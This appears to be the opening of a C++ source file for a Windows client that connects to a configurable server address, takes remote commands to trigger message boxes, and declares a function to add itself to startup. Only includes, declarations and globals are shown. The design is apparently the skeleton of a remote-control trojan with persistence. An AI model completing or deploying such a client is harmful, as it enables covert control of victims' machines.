#include <iostream>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <map>
#include <string>
#include <Shlwapi.h> //NOTE LINKER SETTINGS: -lShlwapi
#include <process.h>
#include <sstream>

//NOTE, should we leave it as preprocessor definitions? Or go the "correct" way and use const variables? Its your choice.
#define IP_ADDR "127.0.0.1" //THIS VARIABLE WILL BE CHANGED AS THE CLIENT PROGRAM IS TAILORED TO THE USER'S SETTINGS.
#define PORTNO 80 //THIS VARIABLE WILL BE CHANGED AS CLIENT PROGRAM IS TAILORED TO THE USER'S SETTINGS
#define PROGRAM_NAME "fuck.exe" //THIS WILL BE THE PROGRAM FILE NAME

//functions used to multithread.
unsigned int __stdcall TrigBox(void*);
void AddtoStartup();
int HandleError(int);
//namespace declarations
using std::string;
using std::map;
using std::stringstream;

//enumerate server messages so we can process them!
enum SERVERMESSAGE {TRIGMSGBOX, MESSAGE2, MESSAGE3}; //ENUMERATE SERVER COMMANDS, 0 = MESSAGE1, 1 = MESSAGE2

//map the c-style strings to each enumeration or UINT type for our messageboxes.
map<string, SERVERMESSAGE> dictionary;
map<string, UINT> MSGBOX_TYPES;
map<string, UINT> MSGBOX_ICONS;

const int buffersize = 5000;

string client_operator;
string client_operand;
string ipaddress = IP_ADDR;

int portnumber = PORTNO;


